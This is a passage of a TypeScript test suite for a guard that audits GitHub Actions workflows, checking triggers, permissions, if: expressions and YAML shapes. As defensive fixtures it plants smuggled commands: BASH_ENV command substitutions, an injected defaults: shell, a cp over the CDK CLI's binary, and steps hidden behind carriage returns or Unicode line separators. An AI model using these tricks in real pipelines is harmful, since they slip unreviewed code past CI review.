    // A case inside any substitution, quoted or not, or backticks is a shape the reader can't follow (its
    // pattern's ) would close the substitution), which shellViews says.
    expect(shellViews('X="$(case x in x) cp a b;; esac)"').nestedCase).toBe(true)
    expect(shellViews('X=`case x in x) cp a b;; esac`').nestedCase).toBe(true)
    expect(shellViews('X=$(\ncase x in x) cp a b;; esac)').nestedCase).toBe(true)
    expect(shellViews('case "$(readlink -f x)" in\n  y) ;;\nesac').nestedCase).toBe(false)
    expect(shellViews('echo a\\ #b').text).toBe('echo a\\ #b')
    expect(shellViews('echo a #b').text).toBe('echo a   ')
  })

  // Round 3's SECURITY-01: a canonical text is accepted whole, which is sound only while each of its lines
  // that bash evaluates as arithmetic or a name evaluates what the text itself sets (a local, a literal
  // subscript) or bash's own count of seconds (outsideEvaluations() holds that). These are every such line,
  // so a canonical text given another is a reviewed change here too; ONE_OFF's count of withheld lines is
  // jq's now, so it evaluates no command's output.
  it('pins the lines of the canonical texts that bash evaluates as arithmetic or a name', () => {
    const evaluated = (text: string) => evaluatedLines(text).map(n => text.split('\n')[n]?.trim())
    // Every canonical text, by its name (the seventh review's second attack found IMAGE_CHECK and STOP_HEAD
    // left out of a list kept by hand, so a line one gained changed no test): those not named here evaluate
    // nothing.
    const EVALUATING: Readonly<Record<string, readonly string[]>> = {
      ASSET_CHECK: [
        `dir=\${queue[0]}`,
        `queue=("\${queue[@]:1}")`,
        `dir=\${queue[0]}`,
        `queue=("\${queue[@]:1}")`,
        'manifests=$((manifests + 1))',
        'services=$((services + 1))',
      ],
      AWS_CHECK: [
        `tag=$(get aws ecr describe-images --repository-name hearth-server --image-ids "imageDigest=\${digests[0]}" --query 'imageDetails[0].imageTags' --output json 2>/dev/null | jq -r 'first(.[]? | capture("^sha-(?<c>[0-9a-f]{40})-").c) // ""' || true)`,
      ],
      // The log read's count of the pages it read, a local it gives numbers alone.
      ONE_OFF: ['pages=$((pages + 1))'],
      // bash's own SECONDS reads as its count, whatever was assigned to it.
      MAIN_CI: ['DEADLINE=$((SECONDS + 30 * 60))'],
    }
    expect(Object.keys(EVALUATING).every(name => Object.hasOwn(CANONICAL_BY_NAME(), name))).toBe(true)
    for (const [name, text] of Object.entries(CANONICAL_BY_NAME())) {
      expect(evaluated(text), name).toEqual(EVALUATING[name] ?? [])
    }
  })

  // Round 3's GUARDS-03: the word after an assignment's value or a redirection's target that holds a
  // substitution, or a quoted string over two lines, is a command, on one line or after the value's own
  // lines; a substitution as that word is the substitution-as-a-word shape, never a command named by its
  // first character.
  it('reads the command after an assignment or a redirection that holds a substitution', () => {
    const words = (run: string) => shellCommands(run).map(each => each.word)
    expect(words('X=$(true) cp a b')).toEqual(['true', 'cp'])
    expect(words('X="$(true)" cp a b')).toEqual(['true', 'cp'])
    expect(words('X=a$(true)$(false) cp a b')).toEqual(['true', 'false', 'cp'])
    expect(words('< <(true) cp a b')).toEqual(['true', 'cp'])
    expect(words('<$(echo /dev/null) cp a b')).toEqual(['echo', 'cp'])
    expect(words('X=$(true\n) cp a b')).toEqual(['true', 'cp'])
    expect(shellCommands('X=$(true\n) cp a b').find(each => each.word === 'cp')).toMatchObject({
      line: 1,
      prefixes: [expect.stringMatching(/^X=/)],
      substituted: false,
      rest: ' a b',
    })
    expect(words('X=$(true) $(echo cp) a b')).toEqual(['true', 'echo'])
    // A quoted value or target over two lines is one word too.
    expect(shellCommands("X='a\nb' cp a b").map(each => [each.line, each.word])).toEqual([[1, 'cp']])
    expect(words('X="a\n$(true)\nb" cp a b')).toEqual(['true', 'cp'])
    expect(words("< 'a\nb' cp a b")).toEqual(['cp'])
    // An assignment alone runs nothing itself, and what follows an operator is read as before.
    expect(words('X=$(true)')).toEqual(['true'])
    expect(words('X=$(true) || cp a b')).toEqual(['true', 'cp'])
  })

  it("evaluates an if: as GitHub would with some values unknown (Kleene's logic)", () => {
    const bot = { 'github.actor': 'dependabot[bot]' }
    expect(evaluateIf(`\${{ ${BOT_TEST} && x == 'y' }}`, bot)).toBe(false)
    expect(evaluateIf(`\${{ ${BOT_TEST} && x == 'y' || always() }}`, bot)).toBeUndefined()
    expect(evaluateIf(`\${{ ${BOT_TEST} }}`, { 'github.actor': 'a', 'github.triggering_actor': 'b' })).toBe(true)
    const mode = (value: string) => ({ 'needs.gate.outputs.mode': value })
    const condition = `\${{ !cancelled() && (needs.gate.outputs.mode == 'deploy' || needs.gate.outputs.mode == 'rollback') }}`
    expect(evaluateIf(condition, mode('drill-break'))).toBe(false)
    expect(evaluateIf(condition, mode('deploy'))).toBeUndefined()
    expect(evaluateIf(`\${{ needs.gate.outputs.mode != 'rollback' }}`, mode('drill-smoke'))).toBe(true)
    expect(evaluateIf(`\${{ needs.x.outputs.y != '' && z }}`, { 'needs.x.outputs.y': '' })).toBe(false)
    // GUARDS-02: GitHub coerces values of two types to numbers before == or != (null == 0, '0' == false and
    // '' == 0 are true there) and binds ! tighter than ==, so none of these may read as false.
    for (const term of ['null == 0', "'0' == false", "'' == 0", "!'0' == '0'", 'x == 0', "!x == '0'", "'abc' != 0"]) {
      expect(evaluateIf(`\${{ ${term} }}`, { x: '' }), term).not.toBe(false)
      expect(evaluateIf(`\${{ ${BOT_TEST} && y || ${term} }}`, { ...bot, x: '' }), term).not.toBe(false)
    }
    expect(evaluateIf(`\${{ !'' == true }}`, {})).toBe(true)
    expect(evaluateIf(`\${{ 'a' == 'A' && null == null && 1 == 1 && !(true == false) }}`, {})).toBe(true)
    expect(evaluateIf(`\${{ 'a' == 'b' == false }}`, {})).toBe(true)
    // Round 2's GUARDS-03: && and || return an operand, so one with an unknown value keeps it, its truth
    // alone known; strings compare as GitHub upper-cases them, which this reads only for ASCII.
    for (const term of [
      "(github.run_id || 'a') != true",
      "(github.run_id || 'a') == 1",
      '(x && false) == false',
      "'\u212A' != 'k'",
      "'ſ' == 's'",
      "!contains('\u212A', 'k')",
      "!startsWith('ﬀ', 'FF')",
    ]) {
      expect(evaluateIf(`\${{ ${term} }}`, {}), term).toBeUndefined()
      expect(evaluateIf(`\${{ ${BOT_TEST} && y || ${term} }}`, bot), term).toBeUndefined()
    }
    expect(evaluateIf(`\${{ github.run_id || 'a' }}`, {})).toBe(true)
    expect(evaluateIf(`\${{ x && false }}`, {})).toBe(false)
    expect(evaluateIf(`\${{ !(x && false) }}`, {})).toBe(true)
    expect(evaluateIf(`\${{ 'Ab' == 'aB' && endsWith('X[BOT]', '[bot]') }}`, {})).toBe(true)
    // Round 2's GUARDS-04: anything beside the expression makes a string GitHub reads as true.
    for (const value of [`\${{ false }} `, ` \${{ false }}`, `\${{ false }}\n`, 'false', `x\${{ false }}`]) {
      expect(evaluateIf(value, {}), JSON.stringify(value)).toBeUndefined()
    }
    expect(evaluateIf(`\${{ false }}`, {})).toBe(false)
  })
})

describe('DPW-01 (C11-D47, C11-D62): what starts the workflow', () => {
  // Round 2's GUARDS-05: an on: written as a block scalar names its event in text the YAML line reader skips.
  it('finds pull_request_target or workflow_run written as a block scalar under on:, in any workflow', () => {
    const EVENTS = 'uses neither pull_request_target nor workflow_run'
    const BLOCK = 'writes on: with no block scalar, so every event it names is read'
    const ci = workflows.get(CI) ?? ''
    const on = ci.slice(ci.indexOf('\non:\n') + 1, ci.indexOf('\n', ci.indexOf('    branches: [main]\n')) + 1)
    expect(on.startsWith('on:\n')).toBe(true)
    for (const [value, event] of [
      ['|-', 'pull_request_target'],
      ['>-', 'workflow_run'],
      ['|2-', 'pull_request_target'],
      ['|+', 'workflow_run'],
    ] as const) {
      const planted = `on: ${value}\n  ${event}\n`
      expect(triggerFindings(withText(CI, ci.replace(on, planted)), rulesetText), value).toEqual([
        `${CI}: DPW-01 ${EVENTS}`,
        `${CI}: DPW-01 ${BLOCK}`,
      ])
      const other = '.github/workflows/x.yml'
      expect(
        triggerFindings(new Map([...workflows, [other, `name: x\n${planted}jobs: {}\n`]]), rulesetText),
        value,
      ).toEqual([`${other}: DPW-01 ${EVENTS}`, `${other}: DPW-01 ${BLOCK}`])
    }
    // A block scalar anywhere under on: (a filter's) is refused too, and the plain spellings still are.
    const secrets = workflows.get('.github/workflows/secrets.yml') ?? ''
    expect(
      triggerFindings(
        withText(
          '.github/workflows/secrets.yml',
          secrets.replace('    branches-ignore: [main]\n', '    branches-ignore: |\n      main\n'),
        ),
        rulesetText,
      ),
    ).toEqual([`.github/workflows/secrets.yml: DPW-01 ${BLOCK}`])
    expect(triggerFindings(withText(CI, ci.replace(on, 'on: [push, workflow_run]\n')), rulesetText)).toEqual([
      `${CI}: DPW-01 ${EVENTS}`,
    ])
  })

  const ON = [
    `${DEPLOY}: DPW-01 on: is a push to main and a dispatch with exactly the target, mode, release and restore inputs`,
  ]
  const RULES = [`${RULESET}: DPW-01 the required checks include check and migrations and name no deploy.yml job`]
  const on = (from: string, to: string) => triggerFindings(plant(from, to), rulesetText)

  it('finds each planted breakage', () => {
    expect(on('  workflow_dispatch:\n', '  workflow_call:\n  workflow_dispatch:\n')).toEqual(ON)
    expect(on('  workflow_dispatch:\n', "  schedule:\n    - cron: '0 3 * * *'\n  workflow_dispatch:\n")).toEqual(ON)
    expect(on('    branches: [main]\n', "    branches: [main, 'release/*']\n")).toEqual(ON)
    expect(on('        type: string\n', '        type: environment\n')).toEqual(ON)
    expect(on("        default: ''\n", "        default: ''\n        required: true\n")).toEqual(ON)
    expect(triggerFindings(plant('  pull_request:\n', '  pull_request_target:\n', '', CI), rulesetText)).toEqual([
      `${CI}: DPW-01 uses neither pull_request_target nor workflow_run`,
    ])
    expect(
      triggerFindings(
        plant(
          '    needs: [secrets, audit, action-pins, cli-pin]\n',
          '    needs: [secrets, audit, action-pins, cli-pin, gate]\n',
          '',
          CI,
        ),
        rulesetText,
      ),
    ).toEqual([`${CI}: DPW-01 check: needs no deploy.yml job`])
    const migrations = '{ "context": "migrations", "integration_id": 15368 }'
    expect(
      triggerFindings(
        workflows,
        edited(rulesetText, migrations, `${migrations},\n          { "context": "smoke-prod" }`),
      ),
    ).toEqual(RULES)
    expect(triggerFindings(workflows, edited(rulesetText, `,\n          ${migrations}`, ''))).toEqual(RULES)
  })

  it('holds the repository', () => {
    expect(triggerFindings(workflows, rulesetText)).toEqual([])
  })
})

describe('DPW-02 (C11-D55): permissions', () => {
  const ID_TOKEN = `${DEPLOY}: DPW-02 only the five environment jobs ask for an id-token, and nothing asks for write-all`
  const READ_ONLY = '    permissions:\n      contents: read\n'

  it('finds each planted breakage', () => {
    expect(permissionFindings(plant(READ_ONLY, `${READ_ONLY}      id-token: write\n`, job('build')))).toEqual([
      `${DEPLOY}: DPW-02 build: its permissions are exactly contents: read`,
      ID_TOKEN,
    ])
    expect(
      permissionFindings(
        plant('permissions:\n  contents: read\njobs:', 'permissions:\n  contents: read\n  id-token: write\njobs:'),
      ),
    ).toEqual([`${DEPLOY}: DPW-02 the top-level permissions are contents: read alone`, ID_TOKEN])
    expect(permissionFindings(plant(READ_ONLY, `${READ_ONLY}      deployments: write\n`, job('smoke-prod')))).toEqual([
      `${DEPLOY}: DPW-02 smoke-prod: its permissions are exactly contents: read`,
    ])
    expect(
      permissionFindings(
        plant('    environment: nonprod\n', `    environment: \${{ inputs.target }}\n`, job('nonprod')),
      ),
    ).toEqual([`${DEPLOY}: DPW-02 nonprod: names its environment by a literal name`])
    expect(permissionFindings(plant(READ_ONLY, '    permissions: { contents: read }\n', job('build')))).toEqual([
      `${DEPLOY}: DPW-02 build: its permissions are exactly contents: read`,
      `${DEPLOY}: DPW-02 ${BLOCK_MAPPINGS}`,
      `${DEPLOY}: DPW-02 ${SHAPE}`,
    ])
    const check = '  check:\n    needs: [secrets, audit, action-pins, cli-pin]\n'
    expect(permissionFindings(plant(check, `${check}    permissions: write-all\n`, '', CI))).toEqual([
      `${CI}: DPW-02 no job may ask for an id-token`,
    ])
    expect(permissionFindings(plant(check, `${check}    environment: prod\n`, '', CI))).toEqual([
      `${CI}: DPW-02 names no environment`,
    ])
    const secrets = '.github/workflows/secrets.yml'
    expect(
      permissionFindings(
        plant(
          'permissions:\n  contents: read\n',
          'permissions:\n  contents: read\n  "id\\x2Dtoken": write\n',
          '',
          secrets,
        ),
      ),
    ).toEqual([
      `${secrets}: DPW-02 ${SHAPE}`,
      `${secrets}: DPW-02 no key or value is spelled with an escape, which could name id-token or write-all unseen`,
    ])
  })

  // A shape GitHub runs but workflow.ts would read wrong fails, never passes unread.
  it('finds a step, key or value workflow.ts would read wrong, in any workflow', () => {
    const shape = (path: string) => [`${path}: DPW-02 ${SHAPE}`]
    // A step with its keys at ten spaces, and npx run with the credentials in hand: the reader sees no run.
    const step = stepText(deployText, 'nonprod', 'Read back what runs')
    const reindented = step
      .replace('      - name: Read back what runs', '      -   name: Read back what runs')
      .replace(/\n(?=.)/g, '\n  ')
      .replace('            set -euo pipefail\n', '            set -euo pipefail\n            npx cdk deploy --all\n')
    expect(reindented).not.toBe(step)
    const unread = withText(DEPLOY, edited(deployText, step, reindented, job('nonprod')))
    const nonprod = workflowJobs(unread.get(DEPLOY) ?? '').find(each => each.id === 'nonprod')
    expect(nonprod === undefined ? [] : parsedSteps(nonprod).at(-1)?.run).toBeUndefined()
    expect(permissionFindings(unread)).toEqual(shape(DEPLOY))
    // A plain scalar YAML continues on the next line, which the reader would cut at its first.
    const install = '        run: echo "::add-mask::$ACCOUNT_ID"\n'
    expect(permissionFindings(plant(install, `${install}          && npx cdk deploy --all\n`, job('nonprod')))).toEqual(
      shape(DEPLOY),
    )
    expect(
      permissionFindings(
        plant(
          install,
          '        run: "echo ::add-mask::$ACCOUNT_ID\n          && npx cdk deploy --all"\n',
          job('nonprod'),
        ),
      ),
    ).toEqual(shape(DEPLOY))
    expect(
      permissionFindings(
        plant('    runs-on: ubuntu-24.04\n', '    runs-on: ubuntu-24.04\n      self-hosted\n', job('prod')),
      ),
    ).toEqual(shape(DEPLOY))
    // A key given twice, of which the reader keeps the first.
    expect(permissionFindings(plant(install, `${install}        run: npx cdk deploy --all\n`, job('nonprod')))).toEqual(
      shape(DEPLOY),
    )
    expect(
      permissionFindings(
        plant('    runs-on: ubuntu-24.04\n', '    runs-on: ubuntu-24.04\n    runs-on: self-hosted\n', job('prod')),
      ),
    ).toEqual(shape(DEPLOY))
    // A flow sequence over two lines, and a sequence at its key's own indent.
    expect(
      permissionFindings(
        plant(
          '    needs: [gate, build, synth, synth-previous-prod, nonprod, prod-plan, prod-gate]\n',
          '    needs: [gate, build, synth, synth-previous-prod,\n      nonprod, prod-plan, prod-gate]\n',
        ),
      ),
    ).toEqual(shape(DEPLOY))
    expect(
      permissionFindings(
        plant('    steps:\n      - name: Check out', '    steps:\n    - name: Check out', job('smoke-prod')),
      ),
    ).toEqual(shape(DEPLOY))
    // And in ci.yml, whose checkout DPW-11 reads through the same reader.
    expect(
      permissionFindings(plant('      - uses: actions/checkout@', '      -   uses: actions/checkout@', '', CI)),
    ).toEqual(shape(CI))
  })

  // Round 3's GUARDS-01 and GUARDS-02: a carriage return, NEL, LS or PS is a line break to GitHub's YAML
  // reader but not to workflow.ts, which splits only at a newline, so a step after one in a comment line,
  // or a command after one in a run, passed every rule; and a blank but a space or a tab is part of a word
  // to bash, so a # after one is no comment. Each such character, and every other control or format
  // character, is refused in every workflow, named by its line and code point, and each plant here passes
  // every other DPW-02 check. From the eighth review (GUARDS-01) a tab is refused too: YAML never indents
  // with one, and a key indented with spaces and then a tab passed the shape check at its level while the
  // job and step readers, matching spaces alone, never read it, so an env: and its BASH_ENV passed unread.
  it('finds a line break workflow.ts doesn’t split at, a tab, a control or format character or another blank, in any workflow', () => {
    const CHARACTERS =
      'a workflow holds only newlines and printable text: no tab, carriage return, NEL, line or paragraph separator, other control or format character, or blank but a space'
    const odd = (path: string, planted: string, marker: string, point: string) => {
      const at = planted.indexOf(marker)
      expect(at).toBeGreaterThan(-1)
      const line = planted.slice(0, at).split('\n').length
      return [`${path}: DPW-02 line ${line} holds U+${point}, but ${CHARACTERS}`]
    }
    const breaks = [
      ['\r', '000D'],
      ['\u0085', '0085'],
      ['\u2028', '2028'],
      ['\u2029', '2029'],
    ] as const
    const services = '      - name: Services are about to change\n'
    const started = '          echo "services_started=true" >>"$GITHUB_OUTPUT"\n'
    const cp = 'cp "$RUNNER_TEMP/assembly/x.js" node_modules/aws-cdk/bin/cdk'
    for (const [ch, point] of breaks) {
      // A local action after the credentials, hidden behind a line break in a comment line.
      const step = `      # Services next${ch}      - uses: ./.github/actions/hidden\n`
      const hidden = edited(deployText, services, `${step}${services}`, job('nonprod'))
      expect(permissionFindings(withText(DEPLOY, hidden)), point).toEqual(odd(DEPLOY, hidden, step, point))
      // A cp over the CLI's bin, hidden behind one in a run's line.
      const command = `          echo ok${ch}          ${cp}\n`
      const run = edited(deployText, started, `${started}${command}`, job('nonprod'))
      expect(permissionFindings(withText(DEPLOY, run)), point).toEqual(odd(DEPLOY, run, command, point))
    }
    // In ci.yml, a checkout that keeps its credential and an id-token, each behind a carriage return.
    const ciText = workflows.get(CI) ?? ''
    const checkout = '      - uses: actions/checkout@'
    const checkoutAt = ciText.slice(ciText.indexOf(checkout)).split('\n')[0] ?? ''
    const comment = `      # Check out\r${checkoutAt.replace(/@.*/, '@v5')}\n`
    const hiddenCheckout = edited(ciText, `${checkoutAt}\n`, `${comment}${checkoutAt}\n`)
    expect(permissionFindings(withText(CI, hiddenCheckout))).toEqual(odd(CI, hiddenCheckout, comment, '000D'))
    const permissions = 'permissions:\n  contents: read\n'
    const token = `  # Read\r  "id\\x2Dtoken": write\n`
    const hiddenToken = edited(ciText, permissions, `${permissions}${token}`)
    expect(permissionFindings(withText(CI, hiddenToken))).toEqual(odd(CI, hiddenToken, token, '000D'))
    // Line endings a Windows tool writes, and a byte-order mark.
    const crlf = ciText.replaceAll('\n', '\r\n')
    expect(permissionFindings(withText(CI, crlf))).toContain(odd(CI, crlf, '\r', '000D')[0])
    const bom = `\ufeff${ciText}`
    expect(permissionFindings(withText(CI, bom))).toContain(odd(CI, bom, '\ufeff', 'FEFF')[0])
    // A blank bash reads as part of a word, before a #, and other control and format characters.
    for (const [ch, point] of [
      ['\u00a0', '00A0'],
      ['\u000b', '000B'],
      ['\u000c', '000C'],
      ['\u2003', '2003'],
      ['\ufeff', 'FEFF'],
      ['\u202e', '202E'],
      ['\u007f', '007F'],
    ] as const) {
      const command = `          echo ok${ch}#;${cp}\n`
      const run = edited(deployText, started, `${started}${command}`, job('nonprod'))
      expect(permissionFindings(withText(DEPLOY, run)), point).toEqual(odd(DEPLOY, run, command, point))
    }
    // A tab in a key's indentation, which every job and step reader dropped while the shape check placed it
    // at its level: a record job's env: and a step's env: entry, each setting BASH_ENV before a pinned run, a
    // credentialed job's defaults:, and in ci.yml a checkout's uses: after its dash, with no
    // persist-credentials: false, which DPW-11 never saw. Each is refused twice: as a character, and as a
    // line workflow.ts reads at no level (shapeProblems counts only spaces as indentation).
    const shapeFinding = (path: string) => `${path}: DPW-02 ${SHAPE}`
    const recordJob =
      '  record-nonprod:\n    needs: [gate, nonprod, smoke-nonprod, rollback-nonprod, resmoke-nonprod]\n'
    const recordEnv = '   \tenv:\n      BASH_ENV: $(echo planted >&2)\n'
    const recordStep = '      - name: Write the record\n        env:\n'
    const stepEntry = '         \tBASH_ENV: $(echo planted >&2)\n'
    const nonprodEnv = '    env:\n      STAGE: nonprod\n'
    const defaults = "   \tdefaults:\n      run:\n        shell: bash --noprofile --norc -c 'echo planted' {0}\n"
    for (const [from, to, marker] of [
      [recordJob, recordJob.replace('\n', `\n${recordEnv}`), recordEnv],
      [recordStep, `${recordStep}${stepEntry}`, stepEntry],
      [nonprodEnv, `${nonprodEnv}${defaults}`, defaults],
      [recordJob, recordJob.replace('\n', '\n\t\tenv:\n      BASH_ENV: x\n'), '\t\tenv:'],
    ] as const) {
      const planted = edited(deployText, from, to)
      const found = permissionFindings(withText(DEPLOY, planted))
      expect(found, marker).toContain(odd(DEPLOY, planted, marker, '0009')[0])
      expect(found, marker).toContain(shapeFinding(DEPLOY))
      expect(
        found.every(each => each.startsWith(`${DEPLOY}: DPW-02 `)),
        marker,
      ).toBe(true)
    }
    const ciCheckout = `${checkout}v5\n        with:\n          persist-credentials: false\n`
    const tabbed = `      - \tuses: actions/checkout@v5\n`
    const ciPlanted = edited(ciText, ciCheckout, tabbed)
    expect(permissionFindings(withText(CI, ciPlanted))).toEqual([
      odd(CI, ciPlanted, tabbed, '0009')[0],
      shapeFinding(CI),
    ])
  })

  // The clause infra.ts's ciSynthProblems held for ci.yml until C0.11 PR 4, with its cases, as they stood.
  it('holds every other workflow to no id-token in any spelling, comments included, and no escape', () => {
    const check = '  check:\n    needs: [secrets, audit, action-pins, cli-pin]\n'
    const idToken = [`${CI}: DPW-02 no job may ask for an id-token`]
    const escaped = [
      `${CI}: DPW-02 no key or value is spelled with an escape, which could name id-token or write-all unseen`,
    ]
    const ci = (from: string, to: string) => permissionFindings(plant(from, to, '', CI))
    expect(ci('permissions:\n  contents: read\n', 'permissions:\n  contents: read\n  id-token: write\n')).toEqual(
      idToken,
    )
    expect(ci(check, `${check}    permissions: { contents: read, id-token: write }\n`)).toEqual([
      `${CI}: DPW-02 ${SHAPE}`,
      ...idToken,
    ])
    // A quoted key is also a shape workflow.ts doesn't read.
    const shape = `${CI}: DPW-02 ${SHAPE}`
    expect(ci(check, `${check}    permissions:\n      contents: read\n      'id-token': write\n`)).toEqual([
      shape,
      ...idToken,
    ])
    expect(ci(check, `${check}    permissions:\n      "id-token": write\n`)).toEqual([shape, ...idToken])
    expect(ci(check, `${check}    # ID-TOKEN: write, once\n`)).toEqual(idToken)
    expect(
      ci(
        '  secrets:\n    uses: ./.github/workflows/secrets.yml\n',
        '  secrets:\n    permissions:\n      id-token: write\n    uses: ./.github/workflows/secrets.yml\n',
      ),
    ).toEqual(idToken)
    expect(ci(check, `${check}    permissions: { "id\\x2Dtoken": write }\n`)).toEqual([shape, ...escaped])
    expect(ci(check, `${check}    permissions:\n      "id\\u002Dtoken": write\n`)).toEqual([shape, ...escaped])
    expect(ci(check, `${check}    permissions: "write\\x2Dall"\n`)).toEqual(escaped)
  })

  // GUARDS-03: an anchor, alias, tag or flow mapping (but {}) in any workflow is a shape workflow.ts reads
  // wrong, and an escape in a double-quoted scalar anywhere on a line could spell a word a rule looks for:
  // each would have hidden a checkout from DPW-11, pull_request_target from DPW-01, an id-token from this
  // case or a group from DPW-05.
  it('finds an anchor, alias, tag or flow mapping in any workflow, and a double-quoted escape anywhere on a YAML line', () => {
    const shape = (path: string) => `${path}: DPW-02 ${SHAPE}`
    const escaped = `${CI}: DPW-02 no key or value is spelled with an escape, which could name id-token or write-all unseen`
    const checkout = '      - uses: actions/checkout@v5\n'
    const secrets = '.github/workflows/secrets.yml'
    expect(permissionFindings(plant(checkout, `      - { uses: actions/checkout@v5 }\n${checkout}`, '', CI))).toEqual([
      shape(CI),
    ])
    expect(
      permissionFindings(plant(checkout, `      - { uses: actions/checkout@v5 }\n${checkout}`, '', secrets)),
    ).toEqual([shape(secrets)])
    // (The anchor is read as part of the action's name, which is no owner/repo@ref either.)
    expect(permissionFindings(plant(checkout, '      - uses: &co actions/checkout@v5\n', '', CI))).toEqual([
      shape(CI),
      `${CI}: DPW-02 audit (step 1): uses another repository's action, owner/repo@ref, never one of this repository's (./, .\\ or $/, or this repository by its name), whose action.yml no rule reads, an action in a repository's .github folder or a path that climbs out of its own (. or ..) or splits at \\, or a docker:// image`,
    ])
    expect(permissionFindings(plant('name: ci\n', 'name: !!str ci\n', '', CI))).toEqual([shape(CI)])
    const check = '  check:\n    needs: [secrets, audit, action-pins, cli-pin]\n'
    expect(
      permissionFindings(
        plant(check, '  check:\n    concurrency: *g\n    needs: [secrets, audit, action-pins, cli-pin]\n', '', CI),
      ),
    ).toEqual([shape(CI)])
    expect(permissionFindings(plant('name: ci\n', 'name: &k "id\\x2Dtoken"\n', '', CI))).toEqual([shape(CI), escaped])
    // An escape in a flow sequence's item, a sequence item or a value after an anchor, not only after a key.
    expect(permissionFindings(plant('on:\n', 'on: [push, "pull_request\\x5Ftarget"]\nx:\n', '', CI))).toEqual([
      shape(CI),
      escaped,
    ])
    expect(permissionFindings(plant('    branches: [main]\n', '    branches:\n      - "ma\\x69n"\n', '', CI))).toEqual([
      escaped,
    ])
    // An empty flow mapping (pull_request: { }) still reads.
    expect(
      permissionFindings(
        plant('  pull_request:\n    types: [opened, synchronize, reopened, edited]\n', '  pull_request: { }\n', '', CI),
      ),
    ).toEqual([])
  })

  // Round 6's GUARDS-02: YAML reads escapes in a double-quoted scalar alone, so a backslash after a double
  // quote in a plain scalar (a step's one-line run), a single-quoted one or a comment is the same text to
  // GitHub as to the guard and passes, while one in a double-quoted scalar is found wherever YAML starts
  // it on a line: after a key of more than one word, a quoted key, a tag or a complex key's ?, and in one
  // not closed on its line, read on to its close over lines the reader takes for comments. One with no
  // escape over two lines is only a shape the reader refuses (the case above).
  it('finds an escape only in a double-quoted scalar, wherever YAML starts one on a line', () => {
    const escaped = `${CI}: DPW-02 no key or value is spelled with an escape, which could name id-token or write-all unseen`
    const audit = '      - run: npm audit signatures\n'
    const ci = (lines: string) => permissionFindings(plant(audit, `${audit}${lines}`, '', CI))
    for (const lines of [
      `      - run: printf '%s\\n' "audited\\n"\n`,
      '      - run: grep -E "^v[0-9]+\\." .nvmrc || true\n',
      `      - run: echo 'a "b\\c"'\n`,
      '      - run: npm audit # "id\\x2Dtoken"\n',
      '      - run: echo "a" # "b\\c"\n',
      `      - name: 'it''s "x\\y"'\n        run: npm audit\n`,
    ]) {
      expect(ci(lines), lines).toEqual([])
    }
    for (const lines of [
      '      - name: "audit\\x20signatures"\n        run: npm audit signatures\n',
      '      - foo bar: "id\\x2Dtoken"\n',
      '      - "name": "id\\x2Dtoken"\n        run: npm audit\n',
      `      - 'name': "id\\x2Dtoken"\n        run: npm audit\n`,
      '      - name: !!str "id\\x2Dtoken"\n        run: npm audit\n',
      '      - ? "id\\x2Dtoken"\n',
      '      - run: "npm audit\n          sign\\x61tures"\n',
      '      - run: "npm audit\n          #sign\\x61tures"\n',
      '      - run: "npm audit\\\n          signatures"\n',
    ]) {
      expect(ci(lines), lines).toContain(escaped)
    }
  })

  // GUARDS-05: a folded block scalar's lines are joined by YAML, and an indentation indicator sets an indent
  // the reader doesn't take, so GitHub would hand bash another text than the one the guard read.
  // Round 2's GUARDS-04: an if: with anything beside its expression is a string GitHub reads as true, though
  // the guard's reader takes the expression alone (a block scalar's newline dropped, a quoted space trimmed).
  it('finds an if: in deploy.yml that isn’t a plain expression alone', () => {
    const IF = `writes every if: as a plain \${{ … }} alone on its line: quoted, as a block scalar or with text beside it, GitHub reads a string, always true`
    const prodIf = /\n {4}if: (\$\{\{.*\}\})\n/.exec(
      (workflows.get(DEPLOY) ?? '').slice((workflows.get(DEPLOY) ?? '').indexOf(job('prod'))),
    )?.[1]
    expect(prodIf).toBeDefined()
    const download = `        if: \${{ needs.synth.outputs.assembly != '' }}\n`
    for (const [from, to, after] of [
      [`    if: ${prodIf}\n`, `    if: |\n      ${prodIf}\n`, job('prod')],
      [`    if: ${prodIf}\n`, `    if: |+\n      ${prodIf}\n`, job('prod')],
      [`    if: ${prodIf}\n`, `    if: "${prodIf} "\n`, job('prod')],
      [`    if: ${prodIf}\n`, `    if: '${prodIf} '\n`, job('prod')],
      [download, `        if: |\n          \${{ needs.synth.outputs.assembly != '' }}\n`, job('nonprod')],
      [download, `        if: "\${{ needs.synth.outputs.assembly != '' }} "\n`, job('nonprod')],
      [download, `        if: \${{ needs.synth.outputs.assembly != '' }} x\n`, job('nonprod')],
      [download, `        if: needs.synth.outputs.assembly != ''\n`, job('nonprod')],
    ] as const) {
      expect(permissionFindings(plant(from, to, after)), to).toContain(`${DEPLOY}: DPW-02 ${IF}`)
    }
    // Blanks after the expression, or after its comment, are no part of a plain scalar, so GitHub reads the
    // expression alone, as the guard does, and the if: rule refuses nothing (the eighth review's GUARDS-03: two
    // trailing spaces were refused as a string GitHub reads as always true, which it isn't). Since round 11 a
    // line ending in a blank is refused in every workflow, for what workflow.ts reads of a block scalar's line
    // of blanks, so that rule alone names these.
    for (const [from, to, after] of [
      [`    if: ${prodIf}\n`, `    if: ${prodIf}  \n`, job('prod')],
      [download, `        if: \${{ needs.synth.outputs.assembly != '' }} \n`, job('nonprod')],
      [download, `        if: \${{ needs.synth.outputs.assembly != '' }}  # the download's  \n`, job('nonprod')],
    ] as const) {
      expect(permissionFindings(plant(from, to, after)), to).toEqual([`${DEPLOY}: DPW-02 ends no line in a blank`])
    }
  })

  // Round 4: a plain value starting with an indicator YAML reads as structure, a flow item YAML reads as a
  // mapping or as one item where the reader splits two, and an indentation indicator, each in any workflow.
  // Each would hand GitHub another value than the one the reader holds (needs: [secrets, "audit,x"] is two
  // jobs to YAML, three to the reader).
  it('finds a value or flow item YAML reads as structure, and an indentation indicator, in any workflow', () => {
    const shape = [`${CI}: DPW-02 ${SHAPE}`]
    const ci = (from: string, to: string) => permissionFindings(plant(from, to, '', CI))
    const branches = '    branches: [main]\n'
    const needs = '    needs: [secrets, audit, action-pins, cli-pin]\n'
    for (const to of [
      '    branches:\n      - - main\n',
      '    branches:\n      - ? main\n',
      '    branches:\n      - : main\n',
      '    branches: [? main]\n',
      '    branches: [main: x]\n',
      '    branches: [main, x:]\n',
      '    branches: [main, ma#in]\n',
      '    branches: [main, ]\n',
    ]) {
      expect(ci(branches, to), to).toEqual(shape)
    }
    expect(ci(needs, '    needs: [secrets, "audit,x"]\n')).toEqual(shape)
    expect(ci(needs, "    needs: [secrets, 'audit,x']\n")).toEqual(shape)
    expect(ci(needs, '    needs: [secrets, "audit]\n')).toEqual(shape)
